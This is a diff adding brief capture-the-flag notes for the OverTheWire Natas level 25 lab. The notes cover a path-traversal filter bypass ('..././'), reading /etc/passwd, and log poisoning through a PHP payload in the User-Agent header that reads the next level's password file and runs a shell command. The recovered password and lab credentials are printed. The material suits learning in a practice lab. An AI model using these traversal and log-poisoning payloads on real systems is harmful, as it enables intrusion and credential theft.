@@ -1,0 +1,43 @@
+=> This seems like a path traversal vulnerability
+
+=> the only protection is replacing "../" with "" 
+    so sending ..././ gives us ../
+
+=> GET http://natas25.natas.labs.overthewire.org/?lang=..././..././..././..././..././etc/passwd HTTP/1.1
+
+=>sending the following request
+GET http://natas25.natas.labs.overthewire.org/?lang=..././..././..././..././..././var/www/natas/natas25/logs/natas25_b99cjnflq8u4ii9hi6un8klho2.log HTTP/1.1
+User-Agent: <?php include "/etc/natas_webpass/natas26"; ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://natas25.natas.labs.overthewire.org/?lang=en
+Authorization: Basic bmF0YXMyNTpHSEY2WDdZd0FDYVlZc3NIVlkwNWNGcTgzaFJrdGw0Yw==
+Connection: keep-alive
+Cookie: __cfduid=d714489dfc55acdc7aafebcffe0c3ca031570294206; PHPSESSID=b99cjnflq8u4ii9hi6un8klho2
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+Content-Length: 0
+Host: natas25.natas.labs.overthewire.org
+
+
+
+=> oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+
+
+
+=> this can be elivated to code execution with this kind of request
+GET http://natas25.natas.labs.overthewire.org/?lang=..././..././..././..././..././var/www/natas/natas25/logs/natas25_b99cjnflq8u4ii9hi6un8klho2.log HTTP/1.1
+User-Agent: <?php passthru('cat /etc/natas_webpass/natas26'); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://natas25.natas.labs.overthewire.org/?lang=en
+Authorization: Basic bmF0YXMyNTpHSEY2WDdZd0FDYVlZc3NIVlkwNWNGcTgzaFJrdGw0Yw==
+Connection: keep-alive
+Cookie: __cfduid=d714489dfc55acdc7aafebcffe0c3ca031570294206; PHPSESSID=b99cjnflq8u4ii9hi6un8klho2
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+Content-Length: 0
+Host: natas25.natas.labs.overthewire.org
+
